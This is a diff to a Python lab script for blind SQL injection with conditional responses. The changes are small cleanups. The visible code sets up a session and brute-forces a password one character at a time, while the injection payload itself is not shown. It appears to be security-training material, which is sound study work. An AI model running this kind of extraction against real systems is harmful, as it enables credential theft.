@@ -1,7 +1,6 @@
-# Laboratory 02: Blind SQLi
+# Laboratory 02: Blind SQLi with conditional responses
 # Author: Emiliano Rivas (RVXS)
 
-from urllib import request
 import requests, sys, string, urllib, urllib3
 
 # If you want to use Burp Suite proxy, uncomment the 2 lines below
@@ -9,12 +8,12 @@ import requests, sys, string, urllib, urllib3
 
 # burp_proxies = {
 #     'http' : 'http://127.0.0.1:8080',
-#     'https': 'https://127.0.0.1:8080'
+#     'https': 'http://127.0.0.1:8080'
 # }
 
 def exploit(url):
     password   = ""
-    characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
+    characters = string.ascii_letters + string.digits
     session    = requests.Session()
     session_cookies = session.get(url).cookies.get_dict()
 
@@ -43,7 +42,7 @@ def exploit(url):
                 password += char
                 sys.stdout.write('\rPassword: ' + password)
                 sys.stdout.flush()
-                break;
+                break
 
 
 
